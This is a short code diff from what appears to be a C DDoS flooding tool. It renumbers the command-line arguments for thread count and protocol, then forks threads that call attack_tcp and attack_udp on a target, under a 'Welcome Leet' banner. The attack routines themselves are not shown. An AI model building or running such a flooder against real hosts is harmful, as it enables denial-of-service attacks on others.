@@ -177,14 +177,14 @@ int main(int argc, char **argv) {
 		fprintf(stderr, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome Leet\x1b[36m --------\x1b[37m#\r\n");
 
 	}
-	int THREADS = atoi(argv[5]);
+	int THREADS = atoi(argv[4]);
 	for(x=0; x != THREADS; x++) {
-		if(!strcmp(argv[4], "TCP")) {
+		if(!strcmp(argv[3], "TCP")) {
 		if(fork())
 			echoloader();
 			attack_tcp(argv[1], argv[2], x);
 		}
-		if(!strcmp(argv[4], "UDP")) {
+		if(!strcmp(argv[3], "UDP")) {
 		if(fork())
 			echoloader();
 			attack_udp(argv[1], argv[2], x);
